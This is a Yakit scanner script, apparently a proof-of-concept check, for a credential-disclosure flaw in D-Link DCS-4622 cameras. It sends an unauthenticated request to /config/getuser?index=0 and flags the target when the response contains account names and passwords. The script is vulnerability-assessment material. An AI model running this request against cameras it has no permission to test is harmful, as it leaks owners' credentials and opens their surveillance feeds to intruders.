script_name: D-Link DCS-4622 监控账号密码泄露漏洞
content:
yakit.AutoInitYakit()

handleCheck = func(addr){
    isTls = str.IsTLSServer(addr)
    packet = `GET /config/getuser?index=0 HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 2`

    rsp, req, _ = poc.HTTP(packet,
        poc.params({"target": addr}),
        poc.https(isTls),
        poc.redirectTimes(0),
    )

    if len(rsp) > 0 && str.MatchAllOfSubString(rsp, "HTTP/1.1 200") &&
       str.MatchAllOfSubString(rsp, "name") &&
       str.MatchAllOfSubString(rsp, "pass") {
        risk.NewRisk(
            target,
            risk.severity("high"),
            risk.title("D-Link DCS-4622 监控账号密码泄露漏洞"),
            risk.type("Unauthorized Access"),
            risk.request(req),
            risk.response(rsp),
            risk.details({
                "packet": string(packet),
                "payload": "/config/getuser?index=0",
            }),
        )
    }
    return
}

target = cli.String("root_url")
ip, port, _ = str.ParseStringToHostPort(target)
addr = str.HostPort(ip, port)
handleCheck(addr)
